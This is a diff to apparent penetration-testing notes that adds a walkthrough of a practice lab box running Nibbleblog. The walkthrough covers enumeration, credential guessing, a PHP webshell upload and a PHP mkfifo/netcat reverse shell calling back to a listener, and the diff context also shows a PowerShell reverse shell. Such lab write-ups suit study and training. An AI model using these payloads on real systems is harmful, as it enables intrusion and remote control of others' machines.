@@ -168,7 +168,7 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.
 ```
 **Netcat listener**
 ```bash
-nc -lvpn 4444
+nc -lvnp 4444
 ```
 ```
 -l - listen for a connection
@@ -378,3 +378,88 @@ Remote Host
 ```bash
 echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
 ```
+---
+# Prac-App
+**Step 1** - Enumerate open ports on machine via NMAP. The command will conduct a service scan for open ports -oA will output everything nibbles_initial_scan will ouput the scan as that file name in gnmap, nmap, and xml formats. Its a way to name and save your differnt types of scans.
+```bash 
+nmap -sV --open -oA nibbles_initial_scan 10.129.42.190
+```
+The scan revealed two open ports 22/80--
+```
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-16 23:41 EST
+Nmap scan report for 10.129.42.190
+Host is up (0.11s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd <REDACTED> ((Ubuntu))
+|_http-server-header: Apache/<REDACTED> (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+**Step 2** Further enumeration what web server is running 
+```bash 
+whatweb 10.129.42.190
+```
+```
+http://10.129.42.190 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.42.190]
+```
+Browseing to the page showed jsut a hellow word but inspecting the source of the page for comments disclosed another directory. nibbleblog
+Doing another whatweb to this new directory revealed more tech being used on the site.
+```bash
+whatweb http://10.129.42.190/nibbleblog
+```
+```
+http://10.129.42.190/nibbleblog [301 Moved Permanently] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.42.190], RedirectLocation[http://10.129.42.190/nibbleblog/], Title[301 Moved Permanently]
+http://10.129.42.190/nibbleblog/ [200 OK] Apache[2.4.18], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.42.190], JQuery, MetaGenerator[Nibbleblog], PoweredBy[Nibbleblog], Script, Title[Nibbles - Yum yum]
+```
+This appilcation is exploiateble via file upload vulnerability boom. Uploading a php webshell that can be used for exploitation. Looking at the metasploit module for this vulnerability shows that we will need a valid admin username and password to exploit this vulnerability. 
+**Step 3**
+We now need to find a valid admin username and password to get RCE. We can use gobuster to futher enumerate web directories from the site. 
+```bash
+gobuster dir -u http://10.129.42.190/nibbleblog/ --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt
+```
+```
+2020/12/17 00:10:47 Starting gobuster
+===============================================================
+/.hta (Status: 403)
+/.htaccess (Status: 403)
+/.htpasswd (Status: 403)
+/admin (Status: 301)
+/admin.php (Status: 200)
+/content (Status: 301)
+/index.php (Status: 200)
+/languages (Status: 301)
+/plugins (Status: 301)
+/README (Status: 200)
+/themes (Status: 301)
+===============================================================
+2020/12/17 00:11:38 Finished
+```
+
+This confirmes the presence of an admin.php page and a readme page. The readme confirms the version of nibbleblog which validates it is infact vulnerable to the metasploit module. On the admin page we can try a variety of user names and passwords but none work. Looking at the other directories in nubbleblog content we find a users.xml which confirms the username is admin, but no password. Since the file is in xml we can return it in xml via curl with the xmllint command
+```bash
+ curl -s http://10.129.42.190/nibbleblog/content/private/users.xml | xmllint  --format -
+ ```
+ snip-
+ ```
+   <user username="admin">
+```
+password is just name of the box nibbles one of those things where lucky guess and inference take the day.
+**Step 4** Land on the box
+Once we have logged into the admin portal we find we can uplaod an image with one of the plugins. Instead of an image we can uplaod a php webshell. To test this we upload **shell.php** containing --
+```php
+<?php system('id'); ?>
+```
+We than browse to the location where the shell is being stored
+```
+http://10.129.239.88/nibbleblog/content/private/plugins/my_image/image.php
+```
+This executs the command and returns id, so command excution is working in this directory, now we just need to upgrade to a reverse shell via --
+```php
+<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.241 4444 >/tmp/f"); ?>
+```
+We can than launch a nc listener on 4444 to catch the reverse shell when executed. 
+```bash
+nc -lvnp 4444
+```
+From there there we browse again to the old shell location which instantly spawns a reverse shell showing our user flag in the working dir. 
